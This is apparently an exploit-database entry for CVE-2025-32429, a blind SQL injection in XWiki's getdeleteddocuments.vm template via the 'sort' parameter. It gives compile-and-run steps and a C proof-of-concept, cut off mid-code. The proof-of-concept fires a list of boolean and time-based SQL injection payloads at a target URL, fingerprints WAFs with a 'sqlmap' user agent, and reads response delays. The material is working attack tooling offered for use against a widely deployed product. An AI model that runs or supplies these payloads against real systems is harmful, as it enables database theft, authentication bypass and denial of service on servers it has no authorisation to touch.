# Exploit Title: XWiki 14 - SQL Injection via getdeleteddocuments.vm
# Google Dork: N/A
# Date: 28 July 2025
# Exploit Author: Byte Reaper
# LinkedIn: N/A
# Vendor Homepage: https://www.xwiki.org
# Software Link: https://www.xwiki.org
# Version: XWiki Platform ≤ 14.x
# Tested on: XWiki Platform ≤ 14.x
# CVE: CVE-2025-32429

## Vulnerability Description

A blind SQL Injection vulnerability exists in the XWiki Platform’s `getdeleteddocuments.vm` template, specifically via the `sort` parameter. The vulnerability can be exploited by sending a crafted payload to the following REST endpoint:

```
/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=<PAYLOAD>
```

An attacker can inject arbitrary SQL statements into the underlying database query, resulting in data exfiltration, authentication bypass, or denial of service. The vulnerability was verified on XWiki Platform versions up to 14.x using a C-based curl exploit.

## Steps to Reproduce

1. Save the provided `exploit.c` file to your local environment.
2. Compile the PoC:
   ```
   gcc -o exploit exploit.c argparse.c -lcurl
   ```
3. Execute against a vulnerable instance:
   ```
   ./exploit -u http://victim.example.com/xwiki
   ```
4. Observe response delays or injected content indicating successful SQL execution.

## Proof of Concept

- GitHub PoC: https://github.com/byteReaper77/CVE-2025-32429/blob/main/exploit.c

/*
 * Author       : Byte Reaper
 * Telegram     : @ByteReaper0
 * CVE          : CVE-2025-32429
 * Vulnerability: SQL Injection
 * Description : A vulnerability in the xwiki platform using the sort operator in the getdeletedocuments.v file, which leads to injecting malicious SQL statements into the sort= parameter.
 * ------------------------------------------------------------------------------------------------------------------------------------
 */


#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include "argparse.h"
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#define URL 2500
const char *yourUrl = NULL;
int verbose = 0;
int selecetCookie = 0;
const char *cookies = NULL;

void exitAssembly()
{
    __asm__ volatile
    (
        "xor %%rdi, %%rdi\n\t"
        "mov $231, %%rax\n\t"
        "syscall\n\t"
        :
        :
        : "rax",
          "rdi"
    );
}
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitAssembly();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
const char *payload[] =
{
    "' OR '1",
    " ' OR 1 -- -",
    " OR "" = ",
    "\" OR 1 = 1 -- -",
    ",(select * from (select(sleep(5)))a)",
    "%2c(select%20*%20from%20(select(sleep(5)))a)",
    "';WAITFOR DELAY '0:0:05'--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
    "AS INJECTX WHERE 1=1 AND 1=0--",
    "WHERE 1=1 AND 1=1"
};
const char *word[] =
{
    "select",
    "union",
    "insert",
    "update",
    "delete",
    "drop",
    "create",
    "alter",
    "truncate",
    "replace",
    "or",
    "and",
    "not",
    "1=1",
    "1=0",
    "--",
    "#",
    "/*",
    "*/",
    "sleep",
    "benchmark",
    "load_file",
    "outfile",
    "error",
    "warning",
    "mysql",
    "pg_",
    "exec",
    "xp_",
    "admin",
    "root",
    ""
};

int numberPayload = sizeof(payload) / sizeof(payload[0]);
int numberWord = sizeof(word) / sizeof(word[0]);
char full[URL];

void injection(const char *baseUrl)
{
    CURLcode res ;
    CURL *curl = curl_easy_init();
    struct  Mem response =
    {
        NULL,
        0

    };
    if (curl == NULL)
    {
        printf("\e[1;31m[-] Error Create Object Curl !\e[0m\n");
        printf("\e[1;31m[-] Check Your Connection (Ping)...\e[0m\n");
        printf("\e[1;31m[-] Command : ping google.com\n");
        const char *pingCommand = "/bin/ping";
        const char *argv[]      = {"ping", "-c", "5", "google.com", NULL};
        const char *envp[]      = {NULL};
        __asm__ volatile
        (
            "mov %[argv], %%rsi\n\t"
            "mov $59, %%rax\n\t"
            "mov %[envp], %%rdx\n\t"
            "mov %[command], %%rdi\n\t"
            "syscall\n\t"
            "cmp $0, %%rax\n\t"
            "jl exitSyscall\n\t"
            "exitSyscall:\n\t"
            "mov $0x3C, %%rax\n\t"
            "xor %%rdi, %%rdi\n\t"
            "syscall\n\t"
            ".2:\n\t"
            :
            : [argv] "r" (argv),
              [envp] "r" (envp),
              [command] "r" (pingCommand)
            : "rax",
              "rdi",
              "rsi",
              "rdx"
        );
    }

    response.buffer = NULL;
    response.len = 0;
    if (verbose)
    {
        printf("\e[1;35m==========================================\e[0m\n");
        printf("\e[1;33m[+] Cleaning Response...\e[0m\n");
        printf("\e[1;33m[+] Response Buffer : %s\e[0m\n",response.buffer);
        printf("\e[1;33m[+] Response Len : %d\e[0m\n",response.len);
        printf("\e[1;35m==========================================\e[0m\n");
    }

    if (curl)
    {
        int n = 0;
        for (int p = 0; p < numberPayload; p++)
        {
            char *encodePayload = curl_easy_escape(curl,
                                                   payload[p],
                                                   0);
            if (!encodePayload)
            {
                printf("\e[1;31m[-] Error Encode Payload !\e[0m\n");
                exitAssembly();
            }
            snprintf(full,
                     sizeof(full),
                     "%s/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=%s",
                     baseUrl,
                     encodePayload);

            printf("\e[1;34m[+] Encode Payload Successfully.\e[0m\n");
            printf("\e[1;34m[+] Payload Encode : %s\e[0m\n", encodePayload);

            curl_easy_setopt(curl,
                             CURLOPT_URL,
                             full);
            struct timespec ts;
            ts.tv_sec = 0;
            ts.tv_nsec = 10000000;
            printf("\e[1;34m[+] sys_nanosleep syscall (10000000)...\e[0m\n");
            __asm__  volatile
            (
                "mov $35, %%rax\n\t"
                "mov %[ts], %%rdi\n\t"
                "xor %%rsi, %%rsi\n\t"
                "syscall\n\t"
                :
                : [ts] "r" (&ts)
                :"rax", "rdi", "rsi"

            );
            if (selecetCookie)
            {
                curl_easy_setopt(curl,
                                 CURLOPT_COOKIEFILE,
                                 cookies);
                curl_easy_setopt(curl,
                                 CURLOPT_COOKIEJAR,
                                 cookies);

            }
            curl_easy_setopt(curl,
                             CURLOPT_FOLLOWLOCATION,
                             1L);
            curl_easy_setopt(curl,
                             CURLOPT_WRITEFUNCTION,
                             write_cb);
            if (verbose)
            {
                printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
                curl_easy_setopt(curl,
                                 CURLOPT_VERBOSE,
                                 1L);
            }
            curl_easy_setopt(curl,
                             CURLOPT_WRITEDATA,
                             &response);
            curl_easy_setopt(curl,
                             CURLOPT_CONNECTTIMEOUT,
                             5L);
            curl_easy_setopt(curl,
                             CURLOPT_TIMEOUT,
                             10L);
            curl_easy_setopt(curl,
                             CURLOPT_SSL_VERIFYPEER,
                             0L);
            curl_easy_setopt(curl,
                             CURLOPT_SSL_VERIFYHOST,
                             0L);
            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers,
                                        "Accept-Language: en-US,en");
            headers = curl_slist_append(headers,
                                        "Connection: keep-alive");
            headers = curl_slist_append(headers,
                                        "Referer: http://example.com");
            double delayTime;
            clock_t start = clock();
            res = curl_easy_perform(curl);
            printf("\e[1;34m+] Payload : %s\e[0m\n", payload[p]);
            printf("\e[1;34m[+] Encode Payload %s\e[0m\n", encodePayload);
            printf("\e[1;32m[*] PID : %d\e[0m\n", getpid());
            curl_free(encodePayload);
            curl_slist_free_all(headers);
            usleep(1000000);
            if (res == CURLE_OK)
            {

                printf("-----------------------------------------------------------------\n");
                long httpCode  = 0;
                curl_easy_getinfo(curl,
                                  CURLINFO_RESPONSE_CODE,
                                  &httpCode);
                curl_easy_getinfo(curl,
                                  CURLINFO_TOTAL_TIME,
                                  &delayTime);
                printf("\e[1;36m[+] Request sent successfully\e[0m\n");
                printf("\e[1;34m[+] Delay Time Response : %f\e[0m\n",
                       delayTime);
                printf("\e[1;37m[+] Input Url : %s\e[0m\n",
                       baseUrl);
                printf("\e[1;37m[+] Full Url : %s\e[0m\n",
                       full);
                printf("\e[1;32m[+] Http Code -> %ld\e[0m\n", httpCode);
                if (httpCode >= 200 && httpCode < 300)
                {
                    clock_t end = clock();
                    double timeInjection  = (double) (end  - start )/ CLOCKS_PER_SEC;
                    printf("\e[1;36m[+] Positive Http Code (200 < 300) : %ld\n",httpCode);
                    for (int w = 0; w < numberWord; w++)
                    {
                        if (strstr(response.buffer, word[w]) != NULL)
                        {
                            printf("\e[1;34m[+] A suspicious word was found in the server's response !!\e[0m\n");
                            printf("\e[1;34m[+] Word Found : %s\e[0m\n", word[w]);
                            printf("[+] The vulnerability CVE-2025-32429 exists on the server\e[0m\n");
                            printf("\e[1;37m\n======================================== [Response Server] ========================================\e[0m\n");
                            printf("%s\n", response.buffer);
                            printf("\e[1;32m[Len] : %d\e[0m\n", response.len);
                            printf("\e[1;37m\n==================================================================================================\e[0m\n");
                            printf("[+] Check Timeout Response...\e[0m\n");
                            if (timeInjection >= 7.5)
                            {
                                printf("\e[1;34m[+] Possible SQL Executed (Delay Detected)\e[0m\n");
                                printf("\e[1;34m[+] The server is experiencing a vulnerability (CVE-2025-32429)\e[0m\n");
                            }
                            else
                            {
                                printf("\e[1;31m[-] No response delay detected !\e[0m\n");
                            }
                        }
                        else
                        {
                            printf("\e[1;31m[-] No suspicious words were found in the server response !\e[0m\n");

                        }
                    }
                }
                else
                {
                    printf("\e[1;31m[-] HTTP Code Not Range Positive (200 < 300) : %ld\e[0m\n", httpCode);
                    printf("\e[1;34m[+] Try Next Payload : %s\e[0m\n", payload[p]);
                }

            }
            else
            {
                printf("\e[1;31m[-] Error Send Request\e[0m\n");
                printf("\e[1;31m[-] Error : %s\e[0m\n", curl_easy_strerror(res));
                printf("\e[1;31m[-] Please Check Your Connection !\e[0m\n");
                exitAssembly();
            }

        }

    }
    if (response.buffer)
    {
        free(response.buffer);
        response.buffer = NULL;
        response.len = 0;
    }
    curl_easy_cleanup(curl);
}
void checkWaf(const char *base)
{
    printf("[+] Check Waf ============================================================\e[0m\n");
    struct Mem response = {NULL, 0};
    response.buffer = NULL;
    response.len = 0;
    int step1 = 0;
    int step2= 0;
    int step3 = 0;
    int step4 = 0;
    int step5 = 0;
    if (verbose)
    {
        printf("\e[1;33m[+] Response Buffer Cleaning Successfully \e[0m\n");
        printf("\e[1;33m[+] Response Buffer : %s\e[0m\n", response.buffer);
        printf("\e[1;33m[+] Response Len : %zu\e[0m\n", response.len);
    }
    const char *keyWaf[] =
    {
        "Access Denied",
        "Request blocked",
        "Security violation",
        "Your request looks suspicious"
    };
    int numberWaf = sizeof(keyWaf) / sizeof(keyWaf[0]);
    printf("\e[1;34m[+] Base URL : %s\e[0m\n", base);
    CURLcode res;
    char fullWaf[URL];
    snprintf(fullWaf, sizeof(fullWaf),
             "%s/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=''",
             base);
    printf("\e[1;34m[+] Full Url : %s\e[0m\n",fullWaf);
    CURL *curl = curl_easy_init();
    if (curl == NULL)
    {
        printf("\e[1;31m[-] Error: Could not initialize CURL.\e[0m\n");
        exitAssembly();
    }

    curl_easy_setopt(curl,
                     CURLOPT_URL, fullWaf);
    curl_easy_setopt(curl,
                     CURLOPT_FOLLOWLOCATION,
                     1L);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers,
                                "User-Agent: sqlmap");
    curl_easy_setopt(curl,
                     CURLOPT_HTTPHEADER,
                     headers);
    curl_easy_setopt(curl,
                     CURLOPT_WRITEDATA,
                     &response);
    curl_easy_setopt(curl,
                     CURLOPT_WRITEFUNCTION,
                     write_cb);


    res = curl_easy_perform(curl);

    double timeD = 0;
    long code = 0;
    long redirects = 0;
    if (res == CURLE_OK)
    {
        curl_easy_getinfo(curl,
                          CURLINFO_REDIRECT_COUNT,
                          &redirects);
        curl_easy_getinfo(curl,
                          CURLINFO_TOTAL_TIME,
                          &timeD);
        curl_easy_getinfo(curl,
                          CURLINFO_RESPONSE_CODE,
                          &code);
        printf("\e[1;36m[+] Step 1: Check Number redirects\e[0m\n");
        if (redirects > 1)
        {
            printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
            printf("\e[1;34m[+] Suspicious number of redirects: %ld\e[0m\n", redirects);
            printf("\e[1;35m============================================\e[0m\n");
            step1 = 1;
        }
        else
        {
            printf("[-] Waf not detected (Number redirects)\e[0m\n");
        }
        printf("\e[1;34m[+] Request sent with simple payload ('')\e[0m\n");
        printf("\e[1;35m[+] Step 2: Check HTTP Code\e[0m\n");
        printf("\e[1;32m[+] HTTP Code: %ld\e[0m\n", code);
        if (code == 403 ||
            code == 404 ||
            code == 503)
        {
            printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
            printf("\e[1;34m[+] Blocking response code: %ld\e[0m\n", code);
            printf("\e[1;34m[+] Page is likely filtered by WAF.\e[0m\n");
            printf("\e[1;35m============================================\e[0m\n");
            step2 = 1;
        }
        else
        {
            printf("\e[1;31m[-] No blocking HTTP code.\e[0m\n");
            printf("\e[1;31m[-] WAF not detected based on HTTP code.\e[0m\n");
        }

        printf("[+] Step 3: Check Response Time\e[0m\n");
        if (timeD >= 3.0)
        {
            printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
            printf("\e[1;34m[+] Suspicious delay in response: %.2f sec\e[0m\n", timeD);
            printf("\e[1;35m============================================\e[0m\n");
            step3 = 1;
        }
        else
        {
            printf("\e[1;31m[-] Normal response time: %.2f sec\e[0m\n", timeD);
            printf("\e[1;31m[-] WAF not detected based on delay.\e[0m\n");
        }
        printf("[+] Step 4: Check Response Content\e[0m\n");
        for (int l = 0; l < numberWaf; l++)
        {
            if (response.buffer)
            {
                if (strstr(response.buffer, keyWaf[l]))
                {
                    printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
                    printf("\e[1;34m[+] Word Found : %s\e[0m\n",keyWaf[l]);
                    printf("\e[1;34m[+] Waf Detected (Word Found In Response)\e[0m\n");
                    printf("\e[1;35m============================================\e[0m\n");
                    step4 = 1;
                }
                else
                {
                    printf("\e[1;31m[-] Word Not Found  : %s\e[0m\n", keyWaf[l]);
                    printf("\e[1;31m[-] WAF not detected (Not Found Word in response)\e[0m\n");
                }
            }
            else
            {
                printf("\e[1;31m[-] Response Buffer is NULL !\n");
                printf("\e[1;35m[+] Step 5 : Check Response Server (NULL + Http Code 200)\e[0m\n");
                if (code == 200)
                {
                    printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
                    printf("\e[1;32m[+] Http Code : %ld\n", code);
                    printf("\e[1;34m[+] Waf Detected (Response NULL And http Code 200)\e[0m\n");
                    if (verbose && response.buffer)
                    {
                        printf("\e[1;35m[+] Response Server : ==========================================\e[0m\n");
                        printf("%s\e[0m\n", response.buffer);
                    }

                    printf("\e[1;35m============================================\e[0m\n");
                    step5 = 1;

                }
                else
                {
                    printf("\e[1;31m[-] Waf Not Detected (Http Code not 200 And buffer NULL)!\e[0m\n");
                }

            }

        }

    }
    else
    {
        printf("[!] curl_easy_perform() failed: %s\e[0m\n", curl_easy_strerror(res));
    }

    printf("\e[1;35m[+] Step 6: Check Connection Reset\e[0m\n");
    if (res == CURLE_RECV_ERROR)
    {
        printf("\e[1;35m============= [ WAF DETECTED ] =============\e[0m\n");
        printf("\e[1;34m[+] Connection reset detected (CURLE_RECV_ERROR)\e[0m\n");
        printf("\e[1;35m============================================\e[0m\n");
    }
    else
    {
        printf("\e[1;31m[-] No connection reset error.\e[0m\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    printf("\e[1;35m\n[+] Result Status Waf : \e[0m\n");
    if (step1 || step2 || step3 || step4 || step5)
    {
        printf("\e[1;36m[=] Final Verdict: WAF Detected \e[0m\n");
    }
    else
    {
        printf("\e[1;31m[=] Final Verdict: No WAF Detected !\e[0m\n");
    }
}

int main(int argc,
         const char **argv)
{
    printf
    (


        "⣦⠃⣿⣶⣶⣶⣶⣾⠀⠀⠀⠀⠀⠀⢀⡴⣲⠋⢁⡴⠋⠁⠀⣠⠶⠋⠁⠀⣠⢴⠆⠀⢠⠆⠀⢀⣠⢞⡓⠒⠀⠀⠉⠓⠲⢤⣀⠀⠀⠀⠀⠉⢧⡀⠀⠀⠀⠀⠀\n"
        " ⠀⣿⣿⣿⣿⣿⠇⠀⠀⠀⣀⡤⠚⠁⡼⣣⡴⠋⠀⠀⢀⡞⠁⠀⠀⢀⣠⣿⡋⠀⣠⣿⠴⠚⣉⣉⠉⠉⠉⠛⠭⣟⠒⢤⣀⠈⠙⠦⢄⣀⠀⠈⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣸⣿⣿⣿⣿⡟⠀⣴⠚⠉⠁⠀⢀⡾⠟⠉⠀⠀⣀⣴⡟⠀⠀⣠⣖⣋⢹⣿⢁⣾⣏⠠⢤⣀⡀⠉⠙⠆⠀⠀⠀⠈⠳⢤⡈⠳⣄⠀⠀⠉⠙⠶⣌⣳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣿⣿⣿⣿⡿⠀⠀⠈⠛⣒⣒⡾⠋⠀⠀⢀⣤⣾⢫⠟⠀⠀⣸⠧⣄⠘⠳⢯⡉⠈⠉⠓⣄⠀⠉⠻⣍⠛⠲⣄⠀⠀⠀⠀⠙⢦⡈⠓⢄⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⡸⣿⣿⡹⢿⣃⣀⠴⠊⠉⣠⠎⠀⠀⢀⣶⣿⠾⡵⠋⠀⠀⡼⣡⠴⣦⣀⣀⠀⠉⠲⣄⠀⠈⢳⡀⠀⠀⠱⣄⠀⠙⢆⠀⠀⠀⠀⠙⢦⡀⠱⣄⠀⠀⠀⠀⠹⣌⣓⣶⢶⡦⠀⠀⠀\n"
        "⢳⣿⣿⣿⣟⠟⠃⠀⣠⠞⠁⠀⠀⣤⠛⠛⢒⣾⢁⣴⣤⠞⢰⡇⢸⠋⢻⠈⣝⢦⡀⠈⠓⢄⠀⠱⡀⠀⠀⠈⠳⡀⠀⠳⣄⠀⠀⠀⠀⠙⢦⠈⠳⡀⠀⠲⣄⠈⢿⡄⠀⠀⠀⠀⠀\n"
        "⣼⣿⣿⢟⣡⡴⣹⠟⢁⠀⢀⣠⠞⠉⣽⠯⠉⢉⣽⢿⣶⣤⢸⢁⠿⡀⢸⡇⢘⢦⢻⡳⣄⠀⠀⠀⠙⣆⠀⠀⠀⠙⢆⠀⠘⢦⡀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠨⠵⣶⡄⠀⠀⠀⠀⠀\n"
        "⣿⡿⣵⣿⠋⠺⢥⣴⣯⠞⡋⢀⣤⠞⣱⢯⣴⠏⢡⡏⠀⢿⠸⢸⡀⡇⠈⣧⠈⢾⢏⢧⡈⠓⢦⡀⠀⠙⢧⣀⠀⠀⠈⠳⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢺⣯⣽⣦⠀⠀⠀⠀\n"
        "⣿⣾⣿⡅⠀⠀⠀⠸⠯⠯⡖⠋⣰⣣⢣⣿⠃⢀⠏⢠⠀⣾⠀⡞⣧⡇⠀⢸⡄⠘⣞⢇⣌⢆⠀⢻⡳⣄⡀⠈⠓⠤⣄⠀⠈⢣⣀⠻⡀⢦⡀⠀⠀⠀⠀⢀⣀⣰⣆⠉⡝⣧⠀⠀⠀\n"
        "⣿⢯⣿⠙⢦⠀⠀⠀⠀⣼⢁⣼⢇⢏⡿⠃⠀⡾⠀⡌⢀⡏⢰⡇⣿⢿⡇⢸⠻⠀⢸⡞⣯⡜⢦⠀⢷⠈⢻⡳⢤⡀⠈⠙⠒⠀⠙⢳⣅⠀⠙⣄⠀⠀⢸⣿⣿⣿⣿⣆⢰⣸⡄⠀⠀\n"
        "⡏⣼⣿⠒⠒⠤⠤⢤⣸⠃⡼⡛⢸⣼⡇⢠⣠⠁⢸⠁⣼⡇⢸⠀⡿⣿⡇⠸⠀⠀⠀⢻⡘⣧⠘⣇⠘⡆⠀⠹⣦⡈⠓⠦⣄⡀⠀⠀⠉⠳⣄⠈⢇⠀⠐⢿⣿⡛⠟⠋⠀⡇⣧⠀⠀\n"
        "⢠⣿⣿⠀⠀⠀⣠⡾⡿⣼⣧⡇⡇⣿⠀⠀⠻⣄⠀⠀⡇⡇⡆⠀⢻⣿⢇⢶⡀⢠⡄⠈⡿⡸⡆⢸⠀⢧⡀⠀⢻⠙⢆⠀⠀⠉⢳⡦⣄⣀⣈⠙⠾⣄⡀⠀⠀⢰⠀⠀⢠⡇⣿⠀⠀\n"
        "⣸⣿⣿⣄⣤⣾⠟⢠⡇⡏⣿⡇⣧⣿⠀⣀⡀⠈⣧⠀⡇⡇⡇⢸⢸⣿⢸⣼⢷⡀⠹⣄⠁⢳⡁⠀⡇⢈⢣⠀⠈⡇⠈⢧⡀⠀⠀⢷⡀⢢⠈⢹⡛⠓⠙⠛⠒⠈⡇⠀⠸⡇⣿⠀⠀\n"
        "⣿⣿⠟⣩⡞⠁⠀⢸⣷⠀⡟⡇⢸⠋⠻⢷⣝⢦⣿⣆⠀⡇⡇⢸⣾⣿⢼⣿⣼⣳⡄⢹⣧⡀⠁⠀⠗⢸⢸⠀⠀⡇⠀⠀⣷⡀⠀⠀⣷⡈⠀⠀⢧⢘⡀⠀⢀⠀⢸⡀⠀⣇⣿⠀⠀\n"
        "⠛⣡⣾⡏⠀⠀⠀⠀⣿⠀⠃⢻⣼⡀⣠⡄⠙⠿⡟⢹⠘⣿⠁⠀⠀⣿⠀⢻⠈⡏⠻⡄⢿⢳⡀⠀⢀⡟⠸⡇⠀⢸⠀⠀⢸⣷⡀⠀⢳⠳⡀⠀⠸⡎⡇⠀⠸⡇⠀⢷⠀⢹⠇⠀⠀\n"
        "⣴⣿⣿⡇⠀⠀⠀⠀⠸⣆⠀⠘⡿⣿⣿⣅⡀⢀⠟⠸⠀⢻⡥⠀⠀⣿⡄⢸⣆⣱⣀⠙⣦⢯⢳⠀⣸⢧⡇⣿⠀⠸⠀⠀⣸⣇⢳⠀⠘⢇⢹⡀⠀⣇⠃⠀⠀⡇⠀⡌⢷⡈⣆⠀⠀\n"
        "⣿⣿⣿⡇⠀⠀⠀⠀⠀⠹⣄⢠⣿⣿⠟⠋⣵⠏⠀⠀⠀⠸⡇⠈⠙⡟⠛⢺⡷⣶⣯⣭⣈⣿⡟⡇⡟⡼⡇⣿⠀⡇⠀⢀⣿⡞⠚⡀⣼⠘⠆⣇⠀⢸⠀⠀⢀⡇⠀⠁⢀⡷⣜⣄⠀\n"
        "⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠘⢺⡏⢿⣤⠞⠁⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠸⡇⠀⢳⠈⠙⠻⢿⣿⢀⣧⡇⣿⣰⠃⢀⣾⣿⣵⠀⣠⠏⡇⠀⣿⠀⡎⢠⣠⣼⡇⠀⢸⢿⡇⠘⠻⣄\n"
        "⣿⣿⣿⠒⠒⠒⠒⠒⠒⠒⠀⢸⡇⠀⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣴⠈⠃⠀⠀⣸⠏⣼⡸⡟⣳⠃⢀⡞⣏⢋⣼⡟⠁⠀⡇⢠⠏⣸⣱⣾⣟⡿⡡⢀⡿⡿⡇⠀⠀⠈  \n"
        "⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⢹⡦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀⠀⣰⠏⠀⢃⢧⡷⠃⣠⠏⠀⠉⡾⢹⢻⠀⡶⠣⠎⢀⣾⣻⠿⣸⠛⢡⡞⣼⠁⠱⠀⠀\n"
        "⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⡇⠀⠀⠖⠁⠀⠀⠞⡞⢁⣴⠥⠖⠛⢿⢷⣾⡾⡆⣿⣶⣋⣾⣿⣏⠀⢹⡾⠋⢰⠁⠀⠀⠀⠀⠀\n"
        "⣿⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡿⠁⠀⠀⠀⠀⠀⢀⣼⣵⡞⠁⢀⡔⠀⣿⣁⣼⠅⣧⠁⠘⣿⡼⠋⢸⡆⠀⢷⢸⠀⠀⠀⠀⠀⠀⠀\n"
        "⡏⠈⠉⠲⣄⡀⠀⠀⢀⣀⣤⣶⣿⣿⠀⢈⠙⠶⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⢸⠃⢉⡿⠀⠀⢸⣽⠃⠀⠹⣄⣼⠷⠃⠀⠀⢳⠀⠘⣯⢧⠀⠀⠀⠀⠀⠀\n"
        "⣤⣤⣤⣤⣤⣽⣷⣿⣿⣿⣿⣿⣿⣿⡇⠀⠙⠲⣤⠈⠙⠲⣤⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣬⣤⠤⠖⠚⠛⠉⠀⠀⠀⠀⣿⠀⠀⠀⣿⠁⠀⠀⠀⢀⣼⠃⢰⡏⠀⠁⠀⠀⠀⠀⠀\n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡼⠁⠀⠀⣼⠙⠂⠀⣀⡶⠋⢀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀\n "
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠚⠉⠀⠀⢀⡴⠁⠀⣠⠞⢁⣴⢾⣯⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⣀⣀⣀⣀⣀⣀⡠⢤⠞⠁⠀⠀⠀⠀⠀⠀⢀⣠⠤⠞⠋⢁⣀⣠⠤⠴⠚⠉⣀⣠⠜⢁⡴⣿⣧⣸⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣄ \n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠻⣅⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⢀⣠⠖⠋⠁⠀⠒⠊⠉⠁⠀⠀⠀⢀⣀⣭⣤⡖⢋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠈⠓⠦⣄⣸⠁⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⣀⡤⠴⢺⣿⣿⣿⣿⣿⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⢻⣀⣀⡤⠴⠶⠶⠶⠶⠦⢤⣤⠖⠋⠁⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿ \n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀\n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣀⡤⠴⠶⠶⠶⢤⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀\n"
        "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⡴⠋⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀\n"

    );
    const char *name = "\e[1;37m\t\t\t[ Byte Reaper ]\e[0m\n";
    int s = 0;
    while (name[s] != '\0')
    {
        printf("%c", name[s]);
        fflush(stdout);
        usleep(100000);
        s++;
    }

    printf("---------------------------------------------------------------------\n");
    struct argparse_option options[] =
    {
        OPT_HELP(),
        OPT_STRING('u',
                   "url",
                   &yourUrl,
                   "Target Url (Base URL)"),
        OPT_STRING('c',
                   "cookies",
                   &cookies,
                   "cookies File"),
